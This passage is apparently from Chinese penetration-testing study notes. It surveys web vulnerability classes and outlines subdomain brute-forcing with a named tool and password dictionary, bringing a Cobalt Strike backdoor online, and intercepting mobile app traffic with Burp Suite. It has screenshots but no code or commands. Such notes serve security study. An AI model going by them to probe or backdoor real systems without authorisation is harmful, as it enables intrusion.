class="headerlink" title="架构漏洞安全测试简要介绍？"></a>架构漏洞安全测试简要介绍？</h4><p>web网站-数据库权限-权限提升-内网。</p><h4 id="为什么要从-WEB-层面为主为首？"><a href="#为什么要从-WEB-层面为主为首？" class="headerlink" title="为什么要从 WEB 层面为主为首？"></a>为什么要从 WEB 层面为主为首？</h4><p>不管是PC还是APP本质上都可以以web为突破口。</p><h3 id="WEB相关安全漏洞"><a href="#WEB相关安全漏洞" class="headerlink" title="WEB相关安全漏洞"></a>WEB相关安全漏洞</h3><h4 id="WEB-源码类对应漏洞"><a href="#WEB-源码类对应漏洞" class="headerlink" title="WEB 源码类对应漏洞"></a>WEB 源码类对应漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入</span><br><span class="line">文件上传</span><br><span class="line">XSS</span><br><span class="line">代码执行</span><br><span class="line">变量覆盖</span><br><span class="line">逻辑漏洞</span><br><span class="line">反序列化等</span><br></pre></td></tr></table></figure><h4 id="WEB-中间件对应漏洞"><a href="#WEB-中间件对应漏洞" class="headerlink" title="WEB 中间件对应漏洞"></a>WEB 中间件对应漏洞</h4><p>未授权访问等等</p><h4 id="WEB-数据库对应漏洞"><a href="#WEB-数据库对应漏洞" class="headerlink" title="WEB 数据库对应漏洞"></a>WEB 数据库对应漏洞</h4><p>弱口令等</p><h4 id="WEB-系统层对应漏洞"><a href="#WEB-系统层对应漏洞" class="headerlink" title="WEB 系统层对应漏洞"></a>WEB 系统层对应漏洞</h4><p>提权相关的</p><h4 id="其他第三方对应漏洞"><a href="#其他第三方对应漏洞" class="headerlink" title="其他第三方对应漏洞"></a>其他第三方对应漏洞</h4><p>第三方软件的一些漏洞 eg:QQ</p><p>APP 或 PC 应用结合类</p><p>App或者PC软件的漏洞</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="多级域名的枚举查找"><a href="#多级域名的枚举查找" class="headerlink" title="多级域名的枚举查找"></a>多级域名的枚举查找</h4><p>1.直接百度</p><p><img src="https://p.pstatp.com/origin/pgc-image/a167f286af034ef4b52cfefbff4a4a26"></p><p>2.通过工具进行爆破</p><p><img src="https://p.pstatp.com/origin/pgc-image/b3befccfafed4a54aa56797d0510b66d"></p><p>这里我使用的是Layer子域名爆破工具，下载链接是<code>https://github.com/euphrat1ca/LayerDomainFinder</code>，字典是<code>https://github.com/k8gege/PasswordDic</code>。</p><p>3.域名注册</p><p> 查询A记录、MX记录、C记录</p><h4 id="DNS解析修改后分析（本地或服务）"><a href="#DNS解析修改后分析（本地或服务）" class="headerlink" title="DNS解析修改后分析（本地或服务）"></a>DNS解析修改后分析（本地或服务）</h4><p>前面有实验过，这里就不弄了。</p><h4 id="EXE-后门功能及危害及类似-WEB-后门"><a href="#EXE-后门功能及危害及类似-WEB-后门" class="headerlink" title="EXE 后门功能及危害及类似 WEB 后门"></a>EXE 后门功能及危害及类似 WEB 后门</h4><p>这里因为没有视频中的软件，所有我这里使用的是CS，进行上线。</p><p>关于CS具体操作可以看<code>https://soapffz.com/sec/483.html</code></p><p><img src="https://p.pstatp.com/origin/pgc-image/e52e0b1607f949f9969c455f4590d680"></p><p>可以看到成功上线了。</p><h4 id="APP类结合WEB协议，PC类结合WEB协议"><a href="#APP类结合WEB协议，PC类结合WEB协议" class="headerlink" title="APP类结合WEB协议，PC类结合WEB协议"></a>APP类结合WEB协议，PC类结合WEB协议</h4><p>手机模拟器</p><p>需要设置代理，代理ip为PC端ip。</p><p><img src="https://p.pstatp.com/origin/pgc-image/250377100e2f44e59eff800692b6280f"></p><p>PC端需要通过burp suite进行抓包，设置brup监听端口为代理服务器端口。</p><p><img src="https://p.pstatp.com/origin/pgc-image/76348fc1d8dd41eab976fbd3f3166592"></p><p>之后修改数据包，修改电脑数据包和手机端一致，从app分离出WEB 测试漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
